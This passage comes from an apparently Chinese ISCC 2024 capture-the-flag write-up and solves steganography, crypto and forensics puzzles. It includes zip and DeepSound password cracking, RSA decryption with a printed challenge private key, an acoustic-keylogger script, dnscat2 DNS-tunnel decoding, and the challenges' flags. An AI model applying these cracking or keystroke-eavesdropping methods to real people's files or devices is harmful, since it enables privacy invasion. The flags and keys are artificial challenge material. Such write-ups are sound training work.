ISCC{192.168.1.2,192.168.1.4,24,2024,192.168.1.3,192.168.1.5,0.06,192.168.1.2,192.168.1.3,192.168.1.6,CRC16,4,1}</p><p><img src="https://bu.dusays.com/2024/05/13/66420df641a66.png" alt="image-20240513205621560"></p><h4 id="精装四合一"><a href="#精装四合一" class="headerlink" title="精装四合一"></a>精装四合一</h4><p>四个png</p><p><img src="https://bu.dusays.com/2024/05/13/66420e689795e.png" alt="image-20240513205815890"></p><p>010editer打开</p><p><img src="https://bu.dusays.com/2024/05/13/664216456120c.png" alt="image-20240513213148500"></p><p>发现这四张图片有共同的部分：16进制下的AE426082及之前的都是相同的</p><p>于是将这四张图片的这相同的部分删除，并与0xff异或</p><p><img src="https://bu.dusays.com/2024/05/13/6642179b28c80.png" alt="image-20240513213730263"></p><p>跑脚本 将这四张图片转成一个zip压缩包 得到一个带密码的压缩包文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&#x27;left_foot_invert.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&#x27;left_hand_invert.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">f3 = <span class="built_in">open</span>(<span class="string">&#x27;right_foot_invert.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">f4 = <span class="built_in">open</span>(<span class="string">&#x27;right_hand_invert.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">f5 = <span class="built_in">open</span>(<span class="string">&#x27;1.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3176</span>):</span><br><span class="line">    f5.write(f1.read(<span class="number">1</span>))</span><br><span class="line">    f5.write(f2.read(<span class="number">1</span>))</span><br><span class="line">    f5.write(f3.read(<span class="number">1</span>))</span><br><span class="line">    f5.write(f4.read(<span class="number">1</span>))</span><br><span class="line">f5.write(f1.read(<span class="number">1</span>))</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6642198e0475a.png" alt="image-20240513214549288"></p><p><img src="https://bu.dusays.com/2024/05/13/66421c553da2c.png" alt="image-20240513215740393"></p><p>使用ziperello爆破密码</p><p><img src="https://bu.dusays.com/2024/05/13/66421c8952c36.png" alt="image-20240513215832631"></p><p><img src="https://bu.dusays.com/2024/05/13/66421cc44b358.png" alt="image-20240513215931554"></p><p>解压</p><p><img src="https://bu.dusays.com/2024/05/13/66421d1570c1d.png" alt="image-20240513220052642"></p><p>将.docx改为.zip 解压</p><p><img src="https://bu.dusays.com/2024/05/13/66421d4d107b3.png" alt="image-20240513220148273"></p><p>在word&#x2F;document.xml文件中发现了一串数字</p><p><img src="https://bu.dusays.com/2024/05/13/66421d9e55353.png" alt="image-20240513220309482"></p><p>是n分解</p><p><img src="https://bu.dusays.com/2024/05/13/66421df1dac9e.png" alt="image-20240513220433112"></p><p>在word&#x2F;media目录下发现了true_flag.jpeg</p><p>跑脚本进行RSA解密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">16920251144570812336430166924811515273080382783829495988294341496740639931651</span></span><br><span class="line">p = <span class="number">100882503720822822072470797230485840381</span></span><br><span class="line">q = <span class="number">167722355418488286110758738271573756671</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">c = bytes_to_long(<span class="built_in">open</span>(<span class="string">&#x27;true_flag.jpeg&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664225ac0cbe6.png" alt="image-20240513223731067"></p><h4 id="有人让我给你带个话"><a href="#有人让我给你带个话" class="headerlink" title="有人让我给你带个话"></a>有人让我给你带个话</h4><p>解压出来两个：<br><img src="https://bu.dusays.com/2024/05/25/6651fc359088e.png" alt="image-20240520211938520"></p><p>直接：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -e Tony.png</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fc36abd14.png" alt="image-20240520214217499"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fc35bd751.png" alt="image-20240520214414576"></p><p>分离出一张名为lyra.png的图片</p><p>搭建Lyra语音压缩编解码器环境，将 有人和你说了一些东西 解码</p><p>然后：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bazel build -c opt lyra/cli_example:decoder_main</span><br><span class="line"></span><br><span class="line">bazel-bin/lyra/cli_example/decoder_main --encoded_path=input.lyra --output_dir=output</span><br></pre></td></tr></table></figure><p>去看output文件 里面有一个wav文件</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3648201.png" alt="image-20240520221306310"></p><p>然后进行语音识别</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc353071f.png" alt="image-20240520221405056"></p><p>发现是社会主义核心价值观解码</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc35bd74e.png" alt="image-20240520221432366"></p><p>所以：</p><p>ISCC{BKF2AUYM4CXL}</p><h4 id="钢铁侠在解密"><a href="#钢铁侠在解密" class="headerlink" title="钢铁侠在解密"></a>钢铁侠在解密</h4><p>直接SilentEye</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3626e84.png" alt="image-20240520220327831"></p><p>分离出row_46.txt</p><p>从row_46.txt中得到c1和c2</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc35c25c3.png" alt="image-20240520220431403"></p><p>再结合一张小字条.txt:</p><p>跑脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def HGCD(a, b):</span><br><span class="line">    if 2 * b.degree() &lt;= a.degree() or a.degree() == 1:</span><br><span class="line">        return 1, 0, 0, 1</span><br><span class="line">    m = a.degree() // 2</span><br><span class="line">    a_top, a_bot = a.quo_rem(x ^ m)</span><br><span class="line">    b_top, b_bot = b.quo_rem(x ^ m)</span><br><span class="line">    R00, R01, R10, R11 = HGCD(a_top, b_top)</span><br><span class="line">    c = R00 * a + R01 * b</span><br><span class="line">    d = R10 * a + R11 * b</span><br><span class="line">    q, e = c.quo_rem(d)</span><br><span class="line">    d_top, d_bot = d.quo_rem(x ^ (m // 2))</span><br><span class="line">    e_top, e_bot = e.quo_rem(x ^ (m // 2))</span><br><span class="line">    S00, S01, S10, S11 = HGCD(d_top, e_top)</span><br><span class="line">    RET00 = S01 * R00 + (S00 - q * S01) * R10</span><br><span class="line">    RET01 = S01 * R01 + (S00 - q * S01) * R11</span><br><span class="line">    RET10 = S11 * R00 + (S10 - q * S11) * R10</span><br><span class="line">    RET11 = S11 * R01 + (S10 - q * S11) * R11</span><br><span class="line">    return RET00, RET01, RET10, RET11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GCD(a, b):</span><br><span class="line">    print(a.degree(), b.degree())</span><br><span class="line">    q, r = a.quo_rem(b)</span><br><span class="line">    if r == 0:</span><br><span class="line">        return b</span><br><span class="line">    R00, R01, R10, R11 = HGCD(a, b)</span><br><span class="line">    c = R00 * a + R01 * b</span><br><span class="line">    d = R10 * a + R11 * b</span><br><span class="line">    if d == 0:</span><br><span class="line">        return c.monic()</span><br><span class="line">    q, r = c.quo_rem(d)</span><br><span class="line">    if r == 0:</span><br><span class="line">        return d</span><br><span class="line">    return GCD(d, r)</span><br><span class="line">#填入你的</span><br><span class="line">c1 = 7117699533553404765969385131528285151338883874047219393513901029814899613106269453717071655030129172675347412105954430595550208331319039285488217857645434855450598615444320625125480776280699845905031957935929200678010599182556355228361791925834628474882973819407545131720315147867601310680575703760829182731040820140040334260615959579260885910684316027038899927510111879795075716063442014500311273770317366580295265150626308906058870244474287517539716259093648787486558289028160060146383240853216385418156708531398826125721674525484478695977276018081855744644420524312189516816706523758384677737740206780056214178591</span><br><span class="line">c2 =  669377958220530998982610007334541495452444932327889027701674265488674975296173916526403471415673489599324609944152078024856059305235027055537717831870910926982886484365295480915932635049328982650036966128603589077422350648610838397561368492808627898801217681531847113405878144009338568458330300883098347211123932957521175154078087448270703770013755603755495694142054956736866280513298095095072140518012960164840387268115809107484598575420588399507838816137068511738359026923196816227383685673279881086270565844040540990721264154589480590824198483107578842415945186127864550932032695515688193556824882941308500664944</span><br><span class="line">N = 14333611673783142269533986072221892120042043537656734360856590164188122242725003914350459078347531255332508629469837960098772139271345723909824739672964835254762978904635416440402619070985645389389404927628520300563003721921925991789638218429597072053352316704656855913499811263742752562137683270151792361591681078161140269916896950693743947015425843446590958629225545563635366985228666863861856912727775048741305004192164068930881720463095045582233773945480224557678337152700769274051268380831948998464841302024749660091030851843867128275500525355379659601067910067304244120384025022313676471378733553918638120029697</span><br><span class="line">e = 52595</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fc36c5436.png" alt="image-20240520220630622"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fc37734f9.png" alt="image-20240520220601327"></p><h4 id="magic-keyboard"><a href="#magic-keyboard" class="headerlink" title="magic-keyboard"></a>magic-keyboard</h4><p>之前做过相似的题 找不到了</p><p>找资料的时候也有其他题：<br><code>https://blog.csdn.net/zhang14916/article/details/120814969</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> acoustic_keylogger.audio_processing <span class="keyword">import</span> wav_read, detect_keystrokes, extract_features</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load audio data from the provided file</span></span><br><span class="line">audio_data = wav_read(<span class="string">&quot;./attachment-45.wav&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Detect individual keystrokes within the audio data</span></span><br><span class="line">detected_keystrokes = detect_keystrokes(audio_data, sample_rate=<span class="number">48000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract features from each detected keystroke</span></span><br><span class="line">features_list = [extract_features(keystroke) <span class="keyword">for</span> keystroke <span class="keyword">in</span> detected_keystrokes]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Normalize the feature data</span></span><br><span class="line">scaler = MinMaxScaler()</span><br><span class="line">normalized_features = scaler.fit_transform(features_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a mapping of unique feature sets to alphabets</span></span><br><span class="line">letter_mapping = &#123;&#125;</span><br><span class="line">current_alphabet_code = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">encoded_phrase = []</span><br><span class="line"><span class="keyword">for</span> feature_set <span class="keyword">in</span> normalized_features:</span><br><span class="line">    <span class="keyword">if</span> feature_set[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> letter_mapping:</span><br><span class="line">        letter_mapping[feature_set[<span class="number">0</span>]] = current_alphabet_code</span><br><span class="line">        current_alphabet_code += <span class="number">1</span></span><br><span class="line">    encoded_phrase.append(letter_mapping[feature_set[<span class="number">0</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert the numeric representation back to characters</span></span><br><span class="line">encoded_flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(code) <span class="keyword">for</span> code <span class="keyword">in</span> encoded_phrase)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the set of possible characters for permutation</span></span><br><span class="line">char_options = <span class="string">&#x27;01268acdef&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check for permutations that result in a valid flag</span></span><br><span class="line"><span class="keyword">for</span> char_permutation <span class="keyword">in</span> itertools.permutations(char_options, <span class="number">9</span>):</span><br><span class="line">    char_translation = &#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;g&#x27;</span>: char_permutation[<span class="number">0</span>], <span class="string">&#x27;h&#x27;</span>: char_permutation[<span class="number">1</span>], <span class="string">&#x27;i&#x27;</span>: char_permutation[<span class="number">2</span>],</span><br><span class="line">        <span class="string">&#x27;j&#x27;</span>: char_permutation[<span class="number">3</span>], <span class="string">&#x27;k&#x27;</span>: char_permutation[<span class="number">4</span>], <span class="string">&#x27;l&#x27;</span>: char_permutation[<span class="number">5</span>],</span><br><span class="line">        <span class="string">&#x27;m&#x27;</span>: char_permutation[<span class="number">6</span>], <span class="string">&#x27;n&#x27;</span>: char_permutation[<span class="number">7</span>], <span class="string">&#x27;o&#x27;</span>: char_permutation[<span class="number">8</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Translate the encoded flag using the current permutation</span></span><br><span class="line">        translated_hex = <span class="string">&#x27;&#x27;</span>.join(char_translation.get(char, <span class="string">&#x27;?&#x27;</span>) <span class="keyword">for</span> char <span class="keyword">in</span> encoded_flag)</span><br><span class="line">        flag_bytes = <span class="built_in">bytes</span>.fromhex(translated_hex)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Validate the flag criteria</span></span><br><span class="line">        <span class="keyword">if</span> flag_bytes.endswith(<span class="string">b&#x27;&#125;&#x27;</span>) <span class="keyword">and</span> <span class="string">b&#x27;human&#x27;</span> <span class="keyword">in</span> flag_bytes <span class="keyword">and</span> <span class="string">b&#x27;she&#x27;</span> <span class="keyword">in</span> flag_bytes <span class="keyword">and</span> <span class="string">b&#x27;is&#x27;</span> <span class="keyword">in</span> flag_bytes:</span><br><span class="line">            <span class="built_in">print</span>(flag_bytes)</span><br><span class="line">    <span class="keyword">except</span> ValueError:  <span class="comment"># Catch hexadecimal conversion errors silently</span></span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h3 id="擂台题"><a href="#擂台题" class="headerlink" title="擂台题"></a>擂台题</h3><h4 id="重“隐”"><a href="#重“隐”" class="headerlink" title="重“隐”"></a>重“隐”</h4><p>两个文件</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc353e81b.png" alt="image-20240525133217634"></p><p>发现图片中藏了一个zip</p><p>foremost图片提取</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc364aa00.png" alt="image-20240525134041787"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fc34d5339.png" alt="image-20240525134207920"></p><p>解压</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc35ae576.png" alt="image-20240525134258143"></p><p>有密码</p><p>那我们回头看看音频文件</p><p>deepsound看看</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3547625.png" alt="image-20240525134628918"></p><p>用脚本deepsound2john来进行哈希提取</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3605ddf.png" alt="image-20240525134909706"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fc35b5fa9.png" alt="image-20240525135021808"></p><p>得到密码：teenager</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc350d240.png" alt="image-20240525135100029"></p><p>解密对应的音频得到一个文本文件</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3604d0a.png" alt="image-20240525135125158"></p><p>puzzle solve解密</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc35762a2.png" alt="image-20240525135153979"></p><p>发现密文</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3567847.png" alt="image-20240525135258562"></p><p>随波逐流解密</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc35ba872.png" alt="image-20240525135452588"></p><p>74_re2l_w4t3rm4rk} </p><p>拿到部分flag</p><p>再看音频文件</p><p>听起来像手机按键声</p><p>DTMF Decoder解密</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3649258.png" alt="image-20240525135824040"></p><p>827342312231334132</p><p>然后转九键进行解密得到密码 URHDBDFGE</p><p>回头解压</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc352c2ef.png" alt="image-20240525140201722"></p><p>brainfuck解密</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3632c97.png" alt="image-20240525140426277"></p><p>两端flag连起来</p><p>ISCC{y0u_f1nd_t74_re2l_w4t3rm4rk}</p><h4 id="Listen-to-a-symphony"><a href="#Listen-to-a-symphony" class="headerlink" title="Listen_to_a_symphony"></a>Listen_to_a_symphony</h4><p>两个文件</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3623295.png" alt="image-20240525150226888"></p><p>但是发现</p><p>zip有密码</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3540670.png" alt="image-20240525150253432"></p><p>010打开master180</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3601e96.png" alt="image-20240525150337446"></p><p>发现头文件是png</p><p>Binwalk 提取出另一张图</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc354682a.png" alt="image-20240525150416291"></p><p>题目给了hint</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc352f7e7.png" alt="image-20240525150437539"></p><p>猜测Mozart反转</p><p>解压成功</p><p>用软件识曲得到曲名 Requiem aeternam</p><p>听到后面有摩斯密码</p><p>解密</p><p>–.&#x2F;—&#x2F;—&#x2F;-</p><p>good</p><p>所以把四个单词拼接起来</p><p>ISCC{Mozart_good_Requiem_aeternam}</p><h4 id="World-Line"><a href="#World-Line" class="headerlink" title="World_Line"></a>World_Line</h4><p>两个文件夹</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3546517.png" alt="image-20240525151446921"></p><p>β</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc362de89.png" alt="image-20240525151531220"></p><p>α</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc352edff.png" alt="image-20240525151552842"></p><p>flag1在β中的拼图文件中，在321_1972604.png里有个ISCC</p><p>flag2在β中的拼图文件中，位于123651123_9049  (0U_f4N).png，括号里就是flag2</p><p>flag3在β中的拼图文件夹的8787下，那个key的内容就是part3</p><p>flag4在RSA文件中，是NKCTF2024原题，直接拿NKCTF的脚本梭βase64.txt，然后词频一下就可以得到part4</p><p>才打了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># RSA公钥和私钥定义</span></span><br><span class="line">pubkey_str = <span class="string">&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">prikey_str = <span class="string">&quot;&quot;&quot;-----BEGIN PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41AgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg==</span></span><br><span class="line"><span class="string">-----END PRIVATE KEY-----</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入RSA公钥与私钥</span></span><br><span class="line">pubkey = RSA.import_key(pubkey_str)</span><br><span class="line">prikey = RSA.import_key(prikey_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义Base64替换规则</span></span><br><span class="line">base64_replacements = &#123;</span><br><span class="line">    <span class="string">&quot;/&quot;</span>: <span class="string">&quot;e5Lg^FM5EQYe5!yF&amp;62%V$UG*B*RfQeM&quot;</span>,</span><br><span class="line">    <span class="string">&quot;+&quot;</span>: <span class="string">&quot;n6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8W&quot;</span>,</span><br><span class="line">    <span class="string">&quot;=&quot;</span>: <span class="string">&quot;JXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换Base64编码中的字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_base64_replace</span>(<span class="params">b64_str</span>):</span><br><span class="line">    <span class="keyword">for</span> original, replacement <span class="keyword">in</span> base64_replacements.items():</span><br><span class="line">        b64_str = b64_str.replace(original, replacement)</span><br><span class="line">    <span class="keyword">return</span> b64_str</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反向替换Base64编码中的字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_custom_base64_replace</span>(<span class="params">b64_str</span>):</span><br><span class="line">    <span class="keyword">for</span> replacement, original <span class="keyword">in</span> base64_replacements.items():</span><br><span class="line">        b64_str = b64_str.replace(replacement, original)</span><br><span class="line">    <span class="keyword">return</span> b64_str</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext</span>):</span><br><span class="line">    encrypted_chunks = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(plaintext), <span class="number">128</span>):</span><br><span class="line">        chunk = plaintext[i:i+<span class="number">128</span>]</span><br><span class="line">        encrypted_chunk = <span class="built_in">pow</span>(bytes_to_long(chunk), prikey.d, pubkey.n)</span><br><span class="line">        encrypted_chunks.append(long_to_bytes(encrypted_chunk))</span><br><span class="line">    encrypted_data = <span class="string">b&#x27;&#x27;</span>.join(encrypted_chunks)</span><br><span class="line">    encoded_data = custom_base64_replace(base64.b64encode(encrypted_data).decode())</span><br><span class="line">    <span class="keyword">return</span> encoded_data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext_url_encoded</span>):</span><br><span class="line">    ciphertext_url_decoded = unquote(ciphertext_url_encoded)</span><br><span class="line">    ciphertext_decoded = reverse_custom_base64_replace(ciphertext_url_decoded)</span><br><span class="line">    ciphertext_data = base64.b64decode(ciphertext_decoded)</span><br><span class="line">    decrypted_chunks = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext_data), <span class="number">128</span>):</span><br><span class="line">        chunk = ciphertext_data[i:i+<span class="number">128</span>]</span><br><span class="line">        decrypted_chunk = <span class="built_in">pow</span>(bytes_to_long(chunk), pubkey.e, pubkey.n)</span><br><span class="line">        decrypted_chunks.append(long_to_bytes(decrypted_chunk))</span><br><span class="line">    decrypted_text = <span class="string">b&#x27;&#x27;</span>.join(decrypted_chunks)</span><br><span class="line">    <span class="keyword">return</span> decrypted_text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主程序</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ciphertext = <span class="string">&quot;Ie5Lg^FM5EQYe5!yF&amp;62%V$UG*B*RfQeM...[省略的长字符串]...&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;加密数据: <span class="subst">&#123;ciphertext&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    decrypted_text = decrypt(ciphertext)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密数据: <span class="subst">&#123;decrypted_text&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h4><p>研究了一下</p><p>找到了一道[相似的题](<a href="https://www.ips99.com/show/4/535735.html">https://www.ips99.com/show/4/535735.html</a> task4)</p><p>根据这个打</p><p>选取所有192.168.157.144与192.168.157.145通信的数据包，且大小在 200 以上</p><p>wireshark打开</p><blockquote><p>ip.src eq 192.168.157.145  &amp;&amp;  ip.dst eq 192.168.157.144 &amp;&amp; udp.length &gt;200 </p></blockquote><p><img src="https://bu.dusays.com/2024/05/25/6651fc3641c2a.png" alt="image-20240525153214882"></p><p>dnscat2流量</p><p>导出为纯文本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义文件路径</span></span><br><span class="line">input_file_path = <span class="string">r&#x27;D:\流量\1.txt&#x27;</span></span><br><span class="line">output_file_path = <span class="string">r&#x27;D:\流量\2.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取并解析域名</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(input_file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    lines = file.readlines()</span><br><span class="line">domains = [</span><br><span class="line">    re.sub(<span class="string">r&#x27;\.microsofto365\..*&#x27;</span>, <span class="string">&#x27;111&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">clean_domains = [</span><br><span class="line">    <span class="keyword">match</span>.group(<span class="number">1</span>)[<span class="number">18</span>:].replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> domain <span class="keyword">in</span> domains</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">match</span> := re.search(<span class="string">r&#x27;Name: (.*?)111&#x27;</span>, domain))</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为字符串</span></span><br><span class="line">decoded_word = <span class="string">&#x27;&#x27;</span>.join(</span><br><span class="line">    <span class="built_in">chr</span>(<span class="built_in">int</span>(substring, <span class="number">16</span>) <span class="keyword">for</span> domain <span class="keyword">in</span> clean_domains <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(domain), <span class="number">2</span>) <span class="keyword">for</span> substring <span class="keyword">in</span> (domain[i:i+<span class="number">2</span>])</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入到文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(decoded_word)</span><br></pre></td></tr></table></figure><p>跑下脚本处理一下</p><p>查看2.txt</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc363fe09.png" alt="image-20240525153527666"></p><p>由此得到原始的工具名为dnscat2-v0.07-client-win32.exe</p><p>md5加密</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3565927.png" alt="image-20240525153734295"></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="练武题-1"><a href="#练武题-1" class="headerlink" title="练武题"></a>练武题</h3><h4 id="迷失之门"><a href="#迷失之门" class="headerlink" 